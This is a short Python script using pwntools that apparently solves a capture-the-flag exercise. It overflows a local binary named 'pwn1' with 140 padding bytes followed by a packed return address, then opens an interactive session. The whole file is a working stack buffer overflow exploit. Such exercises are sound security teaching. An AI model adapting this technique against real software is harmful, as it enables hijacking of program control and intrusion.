from pwn import *

p = process('./pwn1')
garbage = 'a' * 140
target_address = 0x080484ad
address = p32(target_address)
msgin = garbage.encode('ascii') + address
p.sendline(msgin)
p.interactive()
